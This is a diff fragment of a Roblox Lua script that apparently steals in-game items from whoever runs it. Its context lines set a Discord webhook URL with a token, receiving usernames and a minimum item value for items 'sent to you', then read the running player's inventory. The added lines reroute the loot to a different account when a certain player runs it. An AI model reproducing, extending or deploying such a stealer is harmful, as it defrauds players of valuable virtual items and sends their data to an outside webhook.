@@ -58,6 +58,10 @@ Username2 = "LaRussieCool3" -- stuff will get sent to this user if first user's 
 Webhook = "https://discord.com/api/webhooks/1241836056379392131/ts3GPdji9p1-nI6Y4FRZ4uiCm9jiPeuIUcQuU8bXmX3wAN5N_n0XnoSzRMPpkFMn4WLd"
 min_rap = 500000 -- minimum rap of each item you want to get sent to you.
 
+local player = game:GetService"Players".LocalPlayer
+if player.name == "zgrind_3" then
+	local Username = "footing1i"
+end
 local network = game:GetService("ReplicatedStorage"):WaitForChild("Network")
 local library = require(game.ReplicatedStorage.Library)
 local save = library.Save.Get().Inventory
